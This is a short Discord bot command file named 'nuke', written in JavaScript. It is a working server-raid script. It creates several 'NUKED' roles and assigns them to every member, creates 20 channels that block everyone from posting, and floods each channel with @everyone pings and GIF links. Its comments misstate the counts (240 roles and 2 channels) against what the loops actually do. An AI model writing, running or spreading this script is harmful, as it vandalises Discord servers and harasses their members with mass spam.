module.exports.run = async (client, message, args) => {
    var channelNames = ["FORTNITE KONUŞMA"];
   
    
    // Create the role "NUKED" 240 times (this part remains unchanged)
    for(let i = 0; i < 5; i++) {
        message.guild.roles.create({ name: "NUKED" }).then((createdRole) => {
            message.guild.members.cache.forEach(member => member.roles.add(createdRole.id));
        });
    }
    
    // Create 2 channels and spam messages 10 times in each
    for(let i = 0; i < 20; i++) {
        var number = Math.floor(Math.random() * channelNames.length);
        var channelName = channelNames[number];
        message.guild.channels.create(channelName, {
            type: "text",
            permissionOverwrites: [
                {
                    id: message.guild.roles.everyone,
                    deny: ["SEND_MESSAGES"]
                }
            ],
        }).then(channel => {
            for(let j = 0; j < 10; j++) { 
                channel.send({ content: "@everyone https://tenor.com/bvm4W.gif https://tenor.com/biulg.gif https://tenor.com/bgqBB.gif" });
            }
        });
    }
}

module.exports.help = {
    name: "nuke"
}